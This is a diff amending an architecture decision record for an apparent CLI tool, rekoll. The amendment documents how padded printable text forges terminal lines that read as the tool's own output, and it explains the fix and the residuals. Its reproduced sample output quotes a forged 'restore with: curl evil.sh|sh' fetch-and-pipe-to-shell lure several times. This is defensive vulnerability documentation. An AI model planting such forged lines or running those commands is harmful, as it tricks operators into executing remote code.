@@ -1,6 +1,13 @@
 # ADR-0044 — Stored content may appear in a terminal, never drive one
 
-**Status:** Accepted · **Date:** 2026-07-28 · **Implements:** issue #98 · **Amends:** the `cli.py` "stored content is echoed as-is" module rule · **Extends:** ADR-0041 (doctor reports only what it verified) · **Interacts with:** ADR-0013 (envelope byte-identity), ADR-0019 (read-time verification), ADR-0022 (PII redaction)
+**Status:** Accepted · **Date:** 2026-07-28 · **Amended:** 2026-07-28 (see [Amendment](#amendment-2026-07-28--the-padding-half-issue-112)) · **Implements:** issue #98, issue #112 · **Amends:** the `cli.py` "stored content is echoed as-is" module rule · **Extends:** ADR-0041 (doctor reports only what it verified) · **Interacts with:** ADR-0013 (envelope byte-identity), ADR-0019 (read-time verification), ADR-0022 (PII redaction)
+
+> **This ADR shipped incomplete.** As first written it reads as if this class
+> is closed. It closed the *escape* half. The *padding* half — printable text
+> padded to the terminal's wrap boundary — stayed open and was reproduced
+> against the shipped v0.1.4 wheel on both `doctor` and `recall`. Read the
+> [Amendment](#amendment-2026-07-28--the-padding-half-issue-112) at the bottom
+> before relying on anything above it.
 
 ## Context
 
@@ -107,7 +114,15 @@ additionally **reports** when it had to mangle an id, because a well-formed id
 never contains a newline: that is tampering evidence (ADR-0019), and
 swallowing it would be the silence this project keeps fixing.
 
+> **Superseded by the amendment.** `_display_value` is no longer any of those
+> call sites' renderer — it was not enough. They use `_display_token` or
+> `_display_one_line`, and "never contains a newline" is now "never contains
+> whitespace".
+
 ## Known residuals (documented, not hidden)
+
+> The second residual below is **wrong as reasoned**: it argues from an
+> indentation a wrapping terminal does not preserve. See the amendment.
 
 - **U+2028 / U+2029** survive `_display_content` and are the only remaining
   characters `str.splitlines()` treats as breaks, so a forged record can gain
@@ -132,3 +147,141 @@ swallowing it would be the silence this project keeps fixing.
   matches the code.
 - `--json`, `--context`, `--ids`, the board and every MCP payload are
   byte-unchanged; tests pin that too.
+
+---
+
+## Amendment 2026-07-28 — the padding half (issue #112)
+
+**What was missed.** `_display_value()` maps every character outside
+`" ".."~"` to `?` and caps length, so raw ESC and a literal newline are dead.
+**It preserves runs of spaces.** This CLI's human output is column-formatted,
+and the *terminal* — not rekoll — decides where a visual line begins. So
+attacker-chosen text padded to the wrap boundary starts a **visual** line that
+reads as rekoll's own output, using no control character at all.
+
+Reproduced against the **shipped v0.1.4 wheel** (clean venv,
+`pip install "rekoll[mcp]==0.1.4"`, 80 columns) on two surfaces:
+
+```
+   `rekoll doctor`, a repo-committed .mcp.json whose `command` is padded:
+|  ok    firewall   injection screen active; recall is framed as data, not instru
+|ctions
+|  WARN  mcp        .mcp.json registers rekoll, but .mcp.json: command \x
+|ok    firewall   DISABLED - restore with: curl evil.sh|sh does not exist - the s
+
+   `rekoll recall`, a forged record id:
+|    (raw_fact | trust: unverified | id: rk_dead
+|SECURITY ALERT: store corrupt - restore with: curl evil.sh|sh | from: README.md#
+```
+
+The doctor forgery lands directly beneath doctor's own *real* `ok  firewall`
+line, in doctor's own column layout.
+
+**Why it was missed.** This ADR's scope table was built by asking "which
+columns hold stored strings?" and every one of them was found. The question it
+never asked was "what can printable text alone do to a line?" — and that
+question had already been answered, one ADR earlier, in this repo's own source.
+`_display_scope_key`'s docstring says it outright:
+
+> Printable-ASCII still admits the SPACE ... with spaces a hostile store can pad
+> to the terminal width and forge what look like additional Rekoll note lines.
+
+The ADR-0040 lane learned the padding lesson for scope keys and wrote it down.
+The ADR-0041 doctor lane and this lane both read that neighbourhood, inherited
+the **ESC** lesson from it, and did not inherit the **padding** one. A lesson
+recorded only in a docstring next to the one function that applies it does not
+travel; that is the process failure here, and it is why this amendment sits in
+the ADR rather than in a comment.
+
+Two of this ADR's own claims were therefore too strong:
+
+- "A forged id ... **fabricated an entire extra numbered hit using no control
+  characters at all**, which no character filter can catch: it needs the
+  newline gone." The newline was one way. Padding is another, and removing the
+  newline did not touch it.
+- Residual 2, "a line-leading `[2]` inside content renders indented, where a
+  real hit sits at column 0". True of the line rekoll emits; **false of the line
+  the terminal shows**, because a soft-wrapped continuation always begins at
+  column 0.
+
+### What is now closed
+
+Every `_display_value` call site rendering attacker-suppliable text is routed
+to one of two helpers, chosen by what the field legitimately contains:
+
+| Helper | For | Rule |
+| --- | --- | --- |
+| `_display_token` | fields that are ONE token by construction — record id, timestamp, embedder identity, version | **every** whitespace character renders as `?`, plus a tight cap |
+| `_display_one_line` | fields that may hold single spaces — filesystem path, configured command | runs of whitespace collapse to one space |
+
+`_display_value` survives only as the shared primitive behind them.
+
+The token rule is the stronger of the two and is the reason ids are now
+genuinely unforgeable rather than merely un-mimicable: it removes the runs that
+pad to the boundary *and* the single spaces that would let the forged text
+still read as an English sentence once it got there, and the cap truncates what
+is left. The collapse rule is weaker by necessity — `C:\Program Files\...` must
+survive — so it buys the column layout, not immunity (see residuals).
+
+It also closed a **data-loss** vector this ADR missed by one character:
+`recall --ids | xargs rekoll forget` is the documented pipeline, and `xargs`
+splits on *any* whitespace, not just the newline this ADR removed. A single
+space in a forged id therefore aimed the pipeline at a second token — the same
+verified data loss described above, with no control character at all.
+
+### What stays open, and why
+
+**Stored content is unchanged, deliberately.** `_display_content` still keeps
+`\t` and `\n`, and this amendment does **not** collapse whitespace there.
+Determined rather than assumed (the earlier probe was inconclusive, not
+negative — its forged rows were dropped for a stale `content_hash`, which a
+real attacker recomputes). With the hash recomputed, padded content **does**
+forge a hit line:
+
+```
+|[1] backups run nightly to s3
+|[2] SECURITY: rotate the deploy key now with: curl evil.sh | sh
+|    (raw_fact | trust: owner | id: rk_1990862a42c8c1134f26b47a)
+```
+
+And so does content containing **no run of whitespace anywhere** — ordinary
+single-spaced prose of the right length renders identically:
+
+```
+|[1] backups run nightly to s3 and the retention window is thirty days per the op
+|[2] SECURITY: rotate the deploy key now with: curl evil.sh | sh
+|    (raw_fact | trust: owner | id: rk_1990862a42c8c1134f26b47a)
+```
+
+That control case is the finding. For content it is the terminal's **soft
+wrap** that starts the visual line; the padding is only a convenient way to aim
+it. Collapsing whitespace in `_display_content` would therefore deface every
+legitimately indented code snippet in the store — the exact "a viewer must show
+what is stored" line this ADR draws — and close **nothing**. Refusing to print
+long content is worse still: warn-don't-restrict (ADR-0033) forbids hiding the
+operator's own data. Both halves are pinned in
+`tests/test_padded_render_safety.py` so nobody can "fix" content by collapsing
+spaces and call the class closed.
+
+The same soft wrap keeps a weaker residual alive on the **path-shaped** fields
+(`from:` pointers, install paths, configured commands): single-spaced prose can
+still reach a wrap boundary, so such a field can start a visual line. What it
+can no longer do is wear rekoll's columns, which is what made the doctor
+forgery convincing. Token-shaped fields do not have this residual.
+
+**The only real closure is rekoll owning the wrap point** — hard-wrapping its
+own human output to the terminal width so the renderer, not the terminal,
+decides where every visual line begins. That is a change to how *every* human
+line renders (and to what `recall | grep` returns), so it is its own decision
+with its own ADR, not a rider on this fix. It is not done here, and until it is,
+this ADR's honest claim is the narrower one below.
+
+### The claim this ADR is now entitled to make
+
+A committed hostile store or config can no longer move the cursor, clear the
+screen, reorder a line, fabricate a numbered hit **from a metadata field**,
+forge rekoll's column layout, or steer `--ids | forget` onto a record the query
+never matched. It **can** still push its own words onto a visual line of their
+own, from stored `content` and from path-shaped fields, on a wrapping terminal.
+Those words are inert text and are shown as such — but they are not stopped,
+and this document will not say they are.
